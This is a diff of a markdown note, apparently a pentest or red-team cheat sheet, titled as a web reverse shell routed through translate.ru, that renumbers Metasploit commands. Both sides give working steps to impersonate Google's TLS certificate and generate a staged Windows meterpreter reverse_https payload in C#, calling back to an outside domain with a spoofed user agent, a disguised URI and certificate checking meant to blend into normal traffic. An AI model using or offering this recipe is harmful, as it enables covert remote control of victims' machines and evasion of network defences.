@@ -5,13 +5,11 @@ Web reverse shell through translate.ru as proxy
 
 ### Get Cert
 
-use auxiliary/gather/impersonate_ssl
+1. use auxiliary/gather/impersonate_ssl
+2. set RHOST www.google.com
+3. set Proxies http:host:port
+4. run
 
-set RHOST www.google.com
-
-set Proxies http:host:port
-
-run
 
 [\*] www.google.com:443 - Connecting to www.google.com:443
 
@@ -33,18 +31,11 @@ run
 
 ### Generate staged payload with cert check
 
-use payload/windows/meterpreter/reverse_https
-
-set LHOST video.cft-sd.xyz
-
-set LPORT 443
-
-set HttpUserAgent "Mozilla/5.0 (X11; Windows x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
-
-set LURI /rest/api
-
-set stagerverifysslcert true
-
-set HANDLERSSLCERT /media/sf_Pentest/20181213120429_default_74.125.131.106_www.google.com_p_105411.pem
-
-generate -t csharp
+1. use payload/windows/meterpreter/reverse_https
+2. set LHOST video.cft-sd.xyz
+3. set LPORT 443
+4. set HttpUserAgent "Mozilla/5.0 (X11; Windows x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
+5. set LURI /rest/api
+6. set stagerverifysslcert true
+7. set HANDLERSSLCERT /media/sf_Pentest/20181213120429_default_74.125.131.106_www.google.com_p_105411.pem
+8. generate -t csharp
